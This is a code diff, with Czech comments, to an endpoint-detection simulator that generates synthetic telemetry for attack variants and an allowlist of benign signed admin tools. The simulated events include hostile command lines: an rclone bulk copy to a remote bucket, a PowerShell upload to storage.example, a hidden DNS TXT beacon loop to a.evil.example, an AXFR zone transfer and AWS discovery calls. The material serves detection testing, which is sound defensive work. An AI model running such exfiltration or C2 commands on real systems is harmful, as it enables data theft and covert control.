@@ -61,6 +61,8 @@ pub struct EndpointWorld {
     pub agent: AgentMode,
     /// Násobek šumu správcovských nástrojů (citlivostní osa; výchozí 1).
     pub noise: f64,
+    /// Krok 14: podíl neškodných nástrojů, které správce zapsal do seznamu povolených (v %).
+    pub allow_pct: u32,
 }
 
 impl Default for EndpointWorld {
@@ -70,6 +72,7 @@ impl Default for EndpointWorld {
             coverage_pct: 100,
             agent: AgentMode::Honest,
             noise: 1.0,
+            allow_pct: 70,
         }
     }
 }
@@ -108,6 +111,98 @@ pub struct EndpointSim {
     visible: HashMap<u32, bool>,
     /// Zařízení -> (protistrana, benigní vzor) pro celý běh (i pro pozadí).
     regular: Vec<(u32, String, bool, u16)>,
+}
+
+/// Krok 14 (A): podíl událostí, které koncový nástroj vidí, u variant, kde síť sama nestačí
+/// (šifrované hromadné stažení a nahrání, DNS a cloudové API) a u neškodných nástrojů s podpisem.
+/// Volba autora; měření ověřuje zapojení do jádra, ne zisk na reálném provozu.
+fn var_visible_share(label: &str) -> f64 {
+    match label {
+        "bucket_mass_download"
+        | "exfil_cloud_storage_upload"
+        | "c2_cloud_storage_dead_drop"
+        | "cloud_api_discovery_burst"
+        | "drive_by_bulk_download"
+        | "dns_zone_enum_burst"
+        | "c2_dns_txt_beacon" => 0.75,
+        // lidé klikají na odkazy v poště denně: koncový nástroj to od útoku neodliší
+        "clicks_to_rare_destination" => 0.75,
+        l if l.starts_with("hn_") => 0.8,
+        _ => 0.0,
+    }
+}
+
+/// Stabilní otisk podobný SHA-256 podle jména (simulace; reálný hash dodá agent).
+pub fn sim_hash(name: &str) -> String {
+    let mut out = String::with_capacity(64);
+    for i in 0..4u64 {
+        out.push_str(&format!("{:016x}", hash(&format!("{name}#{i}"))));
+    }
+    out
+}
+
+/// Neškodné nástroje s podpisem pro hn_* varianty: (obraz, výrobce).
+fn hn_tool(label: &str) -> Option<(&'static str, &'static str)> {
+    Some(match label {
+        "hn_cdn_update_download" => (
+            "C:\\Program Files\\Microsoft\\Update\\updater.exe",
+            "Microsoft Corporation",
+        ),
+        "hn_nightly_cloud_backup_upload" => (
+            "C:\\Program Files\\Veeam\\Agent\\veeamagent.exe",
+            "Veeam Software",
+        ),
+        "hn_db_replication_bulk" => (
+            "C:\\Program Files\\Microsoft SQL Server\\sqlservr.exe",
+            "Microsoft Corporation",
+        ),
+        "hn_monitoring_snmp_sweep" => {
+            ("C:\\Program Files\\Zabbix\\zabbix_server.exe", "Zabbix SIA")
+        }
+        "hn_password_sync_periodic" => (
+            "C:\\Program Files\\Microsoft Azure AD Sync\\miiserver.exe",
+            "Microsoft Corporation",
+        ),
+        "hn_admin_bulk_ssh" => (
+            "C:\\Program Files\\OpenSSH\\ssh.exe",
+            "Microsoft Corporation",
+        ),
+        "hn_mail_newsletter_burst" => (
+            "C:\\Program Files\\Postfix\\smtp.exe",
+            "The Postfix Project",
+        ),
+        "hn_authorized_internal_scan" => ("C:\\Program Files\\Tenable\\nessus.exe", "Tenable"),
+        _ => return None,
+    })
+}
+
+/// Seznam povolených, který správce nastavil (zbylé neškodné nástroje v něm nejsou).
+pub fn sim_allowlist(now: i64, seed: u64, share_pct: u64) -> crate::endpoint::graph::Allowlist {
+    let mut entries = Vec::new();
+    for label in [
+        "hn_cdn_update_download",
+        "hn_nightly_cloud_backup_upload",
+        "hn_db_replication_bulk",
+        "hn_monitoring_snmp_sweep",
+        "hn_password_sync_periodic",
+        "hn_admin_bulk_ssh",
+        "hn_mail_newsletter_burst",
+        "hn_authorized_internal_scan",
+    ] {
+        if derive(seed, hash(label)) % 100 >= share_pct {
+            continue;
+        }
+        if let Some((image, vendor)) = hn_tool(label) {
+            entries.push(crate::endpoint::graph::AllowEntry {
+                hash: sim_hash(image),
+                vendor: Some(vendor.to_string()),
+                peer: "0.0.0.0/0".into(),
+                owner: "sprava-it".into(),
+                expires_at: now + 90 * 86_400,
+            });
+        }
+    }
+    crate::endpoint::graph::Allowlist { entries }
 }
 
 fn name_of(device: u32) -> String {
@@ -160,7 +255,11 @@ impl EndpointSim {
         for t in truths {
             if let Kind::Attack(family) = t.kind {
                 let mut r = Rng::new(derive(seed, 0x7157 + t.id as u64));
-                visible.insert(t.id, r.chance(visible_share(family)));
+                let share = match family {
+                    Family::Var(i) => var_visible_share(crate::soak::variants::spec(i).label),
+                    other => visible_share(other),
+                };
+                visible.insert(t.id, r.chance(share));
             }
         }
         // benigni pravidelne vzory: pravidelne instance a lookalike (zdroj, protistrana)
@@ -347,6 +446,7 @@ impl EndpointSim {
                         user: Some("SYSTEM".into()),
                         signed: None,
                         vendor: Some("Microsoft Corporation".into()),
+                        hash: None,
                     }),
                 ));
             }
@@ -374,6 +474,7 @@ impl EndpointSim {
                         user: Some("admin".into()),
                         signed: None,
                         vendor: None,
+                        hash: None,
                     }),
                 ));
             }
@@ -392,6 +493,7 @@ impl EndpointSim {
                         user: Some("admin".into()),
                         signed: None,
                         vendor: Some("Microsoft Corporation".into()),
+                        hash: None,
                     }),
                 ));
             }
@@ -447,6 +549,7 @@ impl EndpointSim {
                                 user: Some("iis".into()),
                                 signed: None,
                                 vendor: Some("Microsoft Corporation".into()),
+                                hash: None,
                             }),
                             0,
                             &mut r,
@@ -549,6 +652,7 @@ impl EndpointSim {
                                 user: None,
                                 signed: None,
                                 vendor: None,
+                                hash: None,
                             }),
                             0,
                             &mut r,
@@ -579,11 +683,210 @@ impl EndpointSim {
                                 user: None,
                                 signed: None,
                                 vendor: None,
+                                hash: None,
                             }),
                             0,
                             &mut r,
                             &mut out,
                         );
+                    }
+                }
+                Family::Var(i) => {
+                    let label = crate::soak::variants::spec(i).label;
+                    let peer = ext_peer.clone().unwrap_or_default();
+                    let user = Some("jnovak".to_string());
+                    let proc_ev = |image: &str,
+                                   parent: &str,
+                                   cmd: &str,
+                                   signed: Option<bool>,
+                                   vendor: Option<&str>| {
+                        EventKind::ProcessCreate(Process {
+                            hash: Some(sim_hash(image)),
+                            image: image.to_string(),
+                            parent_image: Some(parent.to_string()),
+                            cmdline: cmd.to_string(),
+                            user: user.clone(),
+                            signed,
+                            vendor: vendor.map(str::to_string),
+                        })
+                    };
+                    let conn_ev = |image: &str, signed: Option<bool>, vendor: Option<&str>| {
+                        EventKind::NetConnect(Conn {
+                            image: Some(image.to_string()),
+                            proto: "tcp".into(),
+                            src_ip: None,
+                            src_port: None,
+                            dst_ip: peer.clone(),
+                            dst_port: 443,
+                            vendor: vendor.map(str::to_string),
+                            signed,
+                        })
+                    };
+                    const PS: &str =
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+                    const MS: &str = "Microsoft Corporation";
+                    if let Some(v) = victims.first().copied() {
+                        match label {
+                            "bucket_mass_download" | "exfil_cloud_storage_upload" if first => {
+                                let img = format!("{WRITABLE}rclone.exe");
+                                emit(
+                                    v,
+                                    proc_ev(
+                                        &img,
+                                        PS,
+                                        "rclone.exe copy D:\\share remote:bucket --transfers 16 --password=xx",
+                                        None,
+                                        None,
+                                    ),
+                                    0,
+                                    &mut r,
+                                    &mut out,
+                                );
+                                emit(v, conn_ev(&img, None, None), 5, &mut r, &mut out);
+                            }
+                            "c2_cloud_storage_dead_drop" if first || r.chance(0.3) => {
+                                emit(
+                                    v,
+                                    proc_ev(
+                                        PS,
+                                        "C:\\Windows\\explorer.exe",
+                                        "powershell.exe -nop Invoke-RestMethod -Uri https://storage.example/d -Method Put -InFile x.bin",
+                                        Some(true),
+                                        Some(MS),
+                                    ),
+                                    0,
+                                    &mut r,
+                                    &mut out,
+                                );
+                            }
+                            "drive_by_bulk_download" if first => {
+                                emit(
+                                    v,
+                                    EventKind::FileCreate {
+                                        image: Some(
+                                            "C:\\Program Files\\Microsoft\\Edge\\msedge.exe".into(),
+                                        ),
+                                        path: "C:\\Users\\jnovak\\Downloads\\update_setup.exe"
+                                            .into(),
+                                    },
+                                    0,
+                                    &mut r,
+                                    &mut out,
+                                );
+                                emit(
+                                    v,
+                                    proc_ev(
+                                        "C:\\Users\\jnovak\\Downloads\\update_setup.exe",
+                                        "C:\\Windows\\explorer.exe",
+                                        "update_setup.exe",
+                                        None,
+                                        None,
+                                    ),
+                                    6,
+                                    &mut r,
+                                    &mut out,
+                                );
+                            }
+                            "dns_zone_enum_burst" if first => {
+                                emit(
+                                    v,
+                                    proc_ev(
+                                        "C:\\Windows\\System32\\nslookup.exe",
+                                        "C:\\Windows\\System32\\cmd.exe",
+                                        "nslookup -type=axfr corp.local",
+                                        Some(true),
+                                        Some(MS),
+                                    ),
+                                    0,
+                                    &mut r,
+                                    &mut out,
+                                );
+                            }
+                            "c2_dns_txt_beacon" if first => {
+                                emit(
+                                    v,
+                                    proc_ev(
+                                        PS,
+                                        "C:\\Windows\\explorer.exe",
+                                        "powershell.exe -w hidden while($true){Resolve-DnsName -Type TXT a.evil.example;Start-Sleep 60}",
+                                        Some(true),
+                                        Some(MS),
+                                    ),
+                                    0,
+                                    &mut r,
+                                    &mut out,
+                                );
+                            }
+                            "cloud_api_discovery_burst" if first => {
+                                for (n, sub) in [
+                                    "iam list-users",
+                                    "s3 ls",
+                                    "ec2 describe-instances",
+                                    "sts get-caller-identity",
+                                ]
+                                .iter()
+                                .enumerate()
+                                {
+                                    emit(
+                                        v,
+                                        proc_ev(
+                                            "C:\\Program Files\\Amazon\\AWSCLIV2\\aws.exe",
+                                            PS,
+                                            &format!("aws {sub}"),
+                                            Some(true),
+                                            Some("Amazon Web Services"),
+                                        ),
+                                        n as i64,
+                                        &mut r,
+                                        &mut out,
+                                    );
+                                }
+                            }
+                            "clicks_to_rare_destination" if first => {
+                                // od běžného kliknutí na odkaz v poště se neliší
+                                emit(
+                                    v,
+                                    proc_ev(
+                                        "C:\\Program Files\\Microsoft\\Edge\\msedge.exe",
+                                        "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+                                        "msedge.exe https://rare.example/offer",
+                                        Some(true),
+                                        Some(MS),
+                                    ),
+                                    0,
+                                    &mut r,
+                                    &mut out,
+                                );
+                            }
+                            l if l.starts_with("hn_") => {
+                                if let Some((image, vendor)) = hn_tool(l) {
+                                    // 20 % instancí používá vlastní nepodepsaný nástroj (v seznamu není)
+                                    let own = derive(self.seed, 0x0A17 + t.id as u64) % 100 < 20;
+                                    let (img, signed, ven) = if own {
+                                        ("D:\\apps\\inhouse\\transfer.exe", None, None)
+                                    } else {
+                                        (image, Some(true), Some(vendor))
+                                    };
+                                    if first || r.chance(0.2) {
+                                        emit(
+                                            v,
+                                            proc_ev(
+                                                img,
+                                                "C:\\Windows\\System32\\services.exe",
+                                                "",
+                                                signed,
+                                                ven,
+                                            ),
+                                            0,
+                                            &mut r,
+                                            &mut out,
+                                        );
+                                        emit(v, conn_ev(img, signed, ven), 3, &mut r, &mut out);
+                                    }
+                                }
+                            }
+                            _ => {}
+                        }
                     }
                 }
                 _ => {}
